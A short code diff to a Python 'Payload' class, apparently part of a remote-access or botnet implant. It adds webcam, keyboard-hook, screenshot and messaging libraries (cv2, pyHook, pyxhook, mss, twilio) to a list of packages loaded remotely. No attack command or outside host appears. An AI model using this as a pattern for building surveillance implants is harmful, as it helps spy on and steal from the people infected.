@@ -97,7 +97,7 @@ class Payload():
 
         """
         self.handlers = {}
-        self.remote = {'modules': [], 'packages': []}
+        self.remote = {'modules': [], 'packages': ['cv2','requests','pyHook','pyxhook','twilio','mss']}
         self.gui = True if kwargs.get('gui') else False
         self.owner = kwargs.get('owner')
         self.flags = self._get_flags()
